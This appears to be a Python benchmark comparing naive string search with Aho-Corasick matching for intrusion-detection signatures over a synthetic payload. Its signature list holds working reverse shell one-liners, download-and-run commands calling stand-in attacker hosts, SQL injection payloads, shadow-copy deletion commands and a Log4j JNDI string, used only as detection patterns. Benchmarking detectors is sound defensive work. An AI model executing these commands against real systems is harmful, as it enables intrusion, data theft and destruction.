import random
import string
import time
import sys
import subprocess
import matplotlib.pyplot as plt

# The C-optimized library is distributed as 'pyahocorasick' on PyPI but imported as 'ahocorasick'.
# Handle missing package, auto-installation, and IDE linter resolution (# type: ignore).
try:
    import ahocorasick  # type: ignore
except (ImportError, ModuleNotFoundError):
    try:
        print("Package 'pyahocorasick' not found. Installing now via pip...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", "pyahocorasick"])
        import ahocorasick  # type: ignore
        print("'pyahocorasick' installed successfully.")
    except Exception as _e:
        print(f"Notice: 'pyahocorasick' could not be loaded ({_e}).")
        ahocorasick = None

from ahocorapy.keywordtree import KeywordTree

# =====================================================================
# 1. Setup and Data Preparation
# =====================================================================

fake_malware_signatures = [
    # --- SQL Injection Patterns (17) ---
    "' OR '1'='1",
    "' UNION SELECT null, username, password FROM admin_users--",
    "'; DROP TABLE authentication_tokens; --",
    "admin' AND 1=1/*",
    "WAITFOR DELAY '0:0:5'--",
    "1' AND 1=CONVERT(int, @@version)--",
    "' OR EXISTS(SELECT * FROM users WHERE admin = 1)--",
    "1; EXEC sp_msforeachdb 'DROP DATABASE ?'",
    "BENCHMARK(50000000, MD5('sqli_test'))",
    "1' AND SLEEP(5)#",
    "' UNION ALL SELECT NULL, NULL, @@version--",
    "' OR 'a'='a' /* arbitrary auth bypass */",
    "1' ORDER BY 32--",
    "1 AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(version(), FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) a)",
    "'; SHUTDOWN WITH NOWAIT; --",
    "' OR pg_sleep(10)--",
    "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT @@version)))--",

    # --- C2 Connection Indicators (17) ---
    "POST /api/v2/beacon/heartbeat HTTP/1.1",
    "User-Agent: CobaltStrike/MalleableC2-Agent-v4",
    "X-Session-Guid: c2-node-session-8f9210bc",
    "GET /gate.php?guid=9988442211&action=recv",
    "CONNECT command-center.shadow-network.internal:8443",
    "Host: c2-domain-fronting-edge.globalcdn.org",
    "BeaconInterval=60&Jitter=15&KillDate=2026-12-31",
    "Malleable-C2-Profile: BankingTrojan-Profile-v3",
    "User-Agent: Mythic-Agent-Apollo-x64-Release",
    "POST /tasks/get_next_payload HTTP/1.1",
    "Authorization: Bearer c2_encrypted_auth_token_99182a",
    "Cookie: C2_SESSION_ID=abc91823746ef71a2bc",
    "X-Implant-ID: Sliver-Implant-Ghost-v1.5",
    "GET /dns-tunnel-query?host=exfil-chunk-001.c2.io",
    "POST /listener/stager.bin HTTP/1.1",
    "X-Forwarded-Host: stage2-cdn-edge.internal-mesh.net",
    "User-Agent: Havoc-Demon-C2-Payload-2.3",

    # --- Bot Activity Indicators (17) ---
    "MIRAI_TELNET_BRUTE_SCANNER_SYN",
    "User-Agent: Mirai-Variant-Arm9-Infection",
    "bot_command: launch_udp_amplification_flood",
    "JOIN #darknet_botnet_command_channel",
    "USER zombie_client 0 * :Zombie Bot Node 44",
    "PING :irc.underground-botnet-cluster.net",
    "PONG :irc.underground-botnet-cluster.net",
    "bot_exec: /tmp/.hidden_bot_daemon start",
    "PRIVMSG #control :!ddos tcp syn 192.168.1.1 80 300",
    "Tsunami-Botnet-SynFlood-PacketStream",
    "Mozi-P2P-Botnet-DHT-Sync-Protocol",
    "Qbot-Infection-Beacon-Handshake-Header",
    "bot_action: download_secondary_payload_dropper",
    "X-Bot-Architecture: mips-little-endian-32bit",
    "DDoS-Attack-Target: 10.0.0.100 TargetPort: 443 Duration: 600",
    "Gafgyt-Scan-Engine-Port-23-Scanner",
    "Satori-IoT-Botnet-Exploit-Dispatch",

    # --- Shell Execution Indicators (17) ---
    "/bin/sh -i 2>&1 | nc -lvp 4444",
    "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand",
    "cmd.exe /c whoami /all && ipconfig /all",
    "/bin/bash -c 'bash -i >& /dev/tcp/10.10.10.10/9001 0>&1'",
    "IEX (New-Object Net.WebClient).DownloadString('http://evil.com/a.ps1')",
    "eval(base64_decode('c3lzdGVtKCcvYmluL3NoJyk7'))",
    "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
    "curl -sSf http://10.0.0.1/reverse_shell.sh | /bin/bash",
    "CertUtil.exe -urlcache -split -f http://attack.org/stage.exe stage.exe",
    "wmic process call create 'calc.exe'",
    "rundll32.exe shell32.dll,Control_RunDLL payload.dll",
    "regsvr32.exe /s /u /i:http://malware.site/script.sct scrobj.dll",
    "mshta.exe vbscript:Close(Execute(\"GetObject(\"\"script:http://site/run\"\")\"))",
    "php -r '$sock=fsockopen(\"10.0.0.1\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
    "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4444",
    "mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.0.0.1 1234 > /tmp/f",
    "echo 'root:password123' | chpasswd && service ssh restart",

    # --- Ransomware-Related Strings (16) ---
    "YOUR_NETWORK_IS_PENETRATED_AND_FILES_ARE_ENCRYPTED.txt",
    "vssadmin.exe delete shadows /all /quiet",
    "wbadmin.exe delete catalog -quiet -keepVersions:0",
    "bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures",
    "bcdedit.exe /set {default} recoveryenabled no",
    "All your documents, photos, databases have been locked with AES-256",
    "Send 2.5 Bitcoin (BTC) to address: bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh",
    "HOW_TO_RECOVER_ENCRYPTED_FILES.html",
    "LockBit-3.0-Black-Ransomware-Identification-Header",
    "WannaCry_WNcry@2ol9_Decryption_Routine_Key",
    "README_DECRYPT_FILES_CONTI_GROUP.txt",
    "REvil_Sodinokibi_Ransom_Payment_Portal_Key",
    "BlackCat_ALPHV_Ransomware_Config_Payload_Block",
    "wevtutil.exe cl System && wevtutil.exe cl Security",
    "Cipher.exe /w:C:\\sensitive_data_directory",
    "Personal Decryption Key: 7b3f91a0c4e8d2516fa84b90123efc5d",

    # --- Network Attack Patterns (16) ---
    "ET EXPLOIT Apache Struts RCE OGNL Injection CVE-2017-5638",
    "Log4j-JNDI-Lookup: ${jndi:ldap://malicious-ldap.attacker.com/Exploit}",
    "Spring4Shell: class.module.classLoader.resources.context.parent.pipeline",
    "EternalBlue-SMBv1-Buffer-Overflow-Exploit-MS17-010",
    "ET SCAN Potential Masscan SSH Banner Grab",
    "SNMPv2-Public-Community-String-Unauthorized-Walk",
    "DNS-Amplification: OPT pseudosection ANY query flood",
    "ProxyLogon-Exchange-SSRF-CVE-2021-26855-Exploit",
    "F5-BIG-IP-iControl-REST-Auth-Bypass-CVE-2022-1388",
    "Citrix-Bleed-Session-Hijack-CVE-2023-4966-Token",
    "HTTP-Smuggling: Transfer-Encoding: chunked \\r\\nContent-Length:",
    "TCP-XMAS-Tree-Attack-Flags-FIN-PSH-URG-Set",
    "Zerologon-Netlogon-Elevation-of-Privilege-CVE-2020-1472",
    "FortiOS-SSL-VPN-Path-Traversal-CVE-2018-13379",
    "Atlassian-Confluence-OGNL-Injection-CVE-2022-26134",
    "NTP-Monlist-Reflection-Denial-of-Service-Flood"
]

# Generate 5,000 additional malware signatures (12 characters, uppercase & lowercase ascii)
print("Generating 5,000 additional malware signatures...")
extra_sigs = [''.join(random.choices(string.ascii_letters, k=12)) for _ in range(5000)]

# Combine Signature Databases
full_signatures = fake_malware_signatures + extra_sigs

# Backward compatibility alias
SIGNATURES = fake_malware_signatures

def generate_payload(size_bytes=50 * 1024 * 1024, signatures=None):
    """
    Generate a dummy network payload of size_bytes using random uppercase,
    lowercase letters, and digits, and inject all signatures at non-overlapping random positions.
    """
    if signatures is None:
        signatures = fake_malware_signatures

    chars = (string.ascii_letters + string.digits).encode('ascii')
    
    print(f"Generating {size_bytes / (1024 * 1024):.1f} MB random alphanumeric payload...")
    payload_bytes = bytearray(random.choices(chars, k=size_bytes))
    
    # Inject each signature at a non-overlapping random position
    num_sigs = len(signatures)
    chunk_size = size_bytes // num_sigs
    
    for i, sig in enumerate(signatures):
        sig_bytes = sig.encode('utf-8', errors='ignore')
        slot_start = i * chunk_size
        slot_end = (i + 1) * chunk_size - len(sig_bytes)
        insert_pos = random.randint(slot_start, max(slot_start, slot_end))
        payload_bytes[insert_pos:insert_pos + len(sig_bytes)] = sig_bytes

    print(f"Injected {num_sigs} signatures into payload.")
    return payload_bytes.decode('latin1')

# =====================================================================
# 2. Native Multi-Pass Matching
# =====================================================================

def native_search(payload, signatures):
    """
    Search for each signature individually using Python's native string matching ('in' operator).
    Count the number of signatures found and return the total match count.
    """
    match_count = 0
    for signature in signatures:
        if signature in payload:
            match_count += 1
    return match_count

# =====================================================================
# 3. Automaton Construction & Aho-Corasick DFA Matching
# =====================================================================

def build_automaton(signatures=fake_malware_signatures):
    """
    Build and compile the C-optimized Aho-Corasick DFA using pyahocorasick.
    Falls back gracefully to KeywordTree if ahocorasick is unavailable.
    """
    if ahocorasick is not None:
        print("Building C-optimized Aho-Corasick DFA...")
        automaton = ahocorasick.Automaton()
        for idx, sig in enumerate(signatures):
            automaton.add_word(sig, (idx, sig))
        automaton.make_automaton()
        print("DFA compilation is complete.")
        return automaton
    else:
        print("Building Aho-Corasick KeywordTree (fallback)...")
        tree = build_keyword_tree(signatures)
        print("KeywordTree compilation is complete.")
        return tree

# Keep keyword tree builder for backward compatibility
def build_keyword_tree(signatures=fake_malware_signatures):
    """Build a KeywordTree using ahocorapy (legacy pure-Python fallback)."""
    tree = KeywordTree(case_insensitive=False)
    for signature in signatures:
        tree.add(signature)
    tree.finalize()
    return tree

def dfa_search(payload, A):
    """
    Accept a network payload string and a compiled Aho-Corasick automaton.
    Use A.iter(payload) to scan the payload with the library's native C implementation.
    Iterate through detected matches, increment a counter, and return total matches.
    Supports both C-optimized ahocorasick.Automaton and legacy ahocorapy.KeywordTree.
    """
    match_count = 0
    if hasattr(A, 'iter'):
        # C-optimized pyahocorasick stream iterator
        for _ in A.iter(payload):
            match_count += 1
    elif hasattr(A, 'search_all'):
        # Legacy KeywordTree fallback
        for _ in A.search_all(payload):
            match_count += 1
    else:
        raise TypeError("Unsupported automaton type passed to dfa_search.")
    return match_count

# =====================================================================
# 4. Integration with NIDS Benchmark
# =====================================================================

def run_benchmark(signatures=None, iterations=5):
    """
    Run NIDS benchmark comparing Python's native multi-pass search against
    the C-optimized Aho-Corasick DFA matching over a 50 MB payload.
    Defaults to full_signatures (5,100 signatures) so that the C-optimized
    Aho-Corasick DFA exhibits its true real-world scaling speedup over
    the native multi-pass algorithm.
    """
    if signatures is None:
        signatures = full_signatures

    print("=" * 60)
    print(" Malicious Signature Detection Benchmark (50 MB Payload)")
    print("=" * 60)
    print(f"Total Signatures : {len(signatures):,}")
    
    # Data Preparation
    t0 = time.perf_counter()
    payload = generate_payload(50 * 1024 * 1024, signatures)
    print(f"Payload Size     : {len(payload.encode('latin1')) / (1024 * 1024):.2f} MB")
    print(f"Prep Time        : {time.perf_counter() - t0:.2f} s\n")

    # Automaton Construction
    t_tree_start = time.perf_counter()
    automaton = build_automaton(signatures)
    compile_time = time.perf_counter() - t_tree_start
    print(f"Automaton Build Time : {compile_time:.4f} s\n")

    iterations = 5
    native_times = []
    dfa_times = []
    native_matches = 0
    dfa_matches = 0

    print(f"Running {iterations} benchmark iterations for each algorithm...\n")

    # Benchmark Native Multi-Pass Search
    for i in range(1, iterations + 1):
        start = time.perf_counter()
        matches = native_search(payload, signatures)
        elapsed = time.perf_counter() - start
        native_times.append(elapsed)
        native_matches = matches
        print(f"  [Native Multi-Pass]          Iteration {i}: {elapsed:.4f} s (Found: {matches})")

    print()

    # Benchmark C-optimized Aho-Corasick DFA Search
    for i in range(1, iterations + 1):
        start = time.perf_counter()
        matches = dfa_search(payload, automaton)
        elapsed = time.perf_counter() - start
        dfa_times.append(elapsed)
        dfa_matches = matches
        print(f"  [C-Optimized Aho-Corasick]   Iteration {i}: {elapsed:.4f} s (Found: {matches})")

    # Calculations
    avg_native_time = sum(native_times) / iterations
    avg_dfa_time = sum(dfa_times) / iterations
    speedup_ratio = avg_native_time / avg_dfa_time if avg_dfa_time > 0 else float('inf')

    # =====================================================================
    # 5. Output Format
    # =====================================================================
    print("\n" + "=" * 60)
    print(" BENCHMARK RESULTS")
    print("=" * 60)
    print(f"DFA Compilation Status               : Completed successfully ({compile_time:.4f} s)")
    print(f"Average Native Python Search Time    : {avg_native_time:.4f} seconds")
    print(f"Average C-Optimized Aho-Corasick Time: {avg_dfa_time:.4f} seconds")
    print(f"Signatures Detected (Native)         : {native_matches}")
    print(f"Signatures Detected (Aho-Corasick)   : {dfa_matches}")
    print(f"Speedup Ratio                        : {speedup_ratio:.2f}x")
    print("=" * 60)

    # =====================================================================
    # 6. Generate Performance Comparison Chart
    # =====================================================================
    generate_chart(avg_native_time, avg_dfa_time)

# =====================================================================
# 6. Performance Visualization Function
# =====================================================================

def generate_chart(native_time, dfa_time):
    """
    Generate and save a publication-quality bar chart comparing execution times.

    Parameters:
        native_time (float/int): Average execution time of Native Multi-Pass String Matching.
        dfa_time (float/int): Average execution time of C-Optimized Aho-Corasick DFA Matching.
    """
    # Error handling for invalid types and negative execution times
    if not isinstance(native_time, (int, float)) or not isinstance(dfa_time, (int, float)):
        raise TypeError(
            f"Execution times must be numeric (int or float). "
            f"Received native_time={type(native_time).__name__}, dfa_time={type(dfa_time).__name__}."
        )
    if native_time < 0 or dfa_time < 0:
        raise ValueError(
            f"Execution times cannot be negative. "
            f"Received native_time={native_time}, dfa_time={dfa_time}."
        )

    # 2. Prepare Chart Data
    algorithms = ["Native Multi-Pass (Script A)", "C-Optimized DFA (Script B)"]
    execution_times = [native_time, dfa_time]
    colors = ["#d9534f", "#5bc0de"]  # Red for Native Multi-Pass, Blue for C-Optimized DFA

    # 3. Configure the Figure
    plt.figure(figsize=(6, 4))
    bars = plt.bar(
        algorithms,
        execution_times,
        color=colors,
        width=0.5,
        edgecolor="#333333",
        linewidth=1.0
    )

    # 4. Add Chart Labels and Title
    plt.ylabel("Execution Time (Seconds)", fontsize=10)
    plt.title(
        "Performance Comparison: Native Search vs. Aho-Corasick DFA (50MB Payload, 5,100 Signatures)",
        fontsize=11,
        fontweight="bold",
        pad=12
    )

    # Visual refinement: subtle horizontal grid lines and headroom for data labels
    plt.grid(axis="y", linestyle="--", alpha=0.6)
    plt.gca().set_axisbelow(True)
    max_height = max(execution_times)
    plt.ylim(0, max_height * 1.15 if max_height > 0 else 1.0)

    # 5. Display Execution Times
    for bar in bars:
        height = bar.get_height()
        plt.text(
            bar.get_x() + bar.get_width() / 2.0,
            height + (max_height * 0.02 if max_height > 0 else 0.02),
            f"{height:.2f}s",
            ha="center",
            va="bottom",
            fontsize=10,
            fontweight="bold"
        )

    # 6. Save the Chart
    plt.tight_layout()
    chart_filename = "performance_comparison_chart.png"
    plt.savefig(chart_filename, dpi=300)
    print(f"Success: Chart saved successfully as '{chart_filename}'.")

    # 7. Display the Chart
    plt.show()

if __name__ == "__main__":
    run_benchmark()
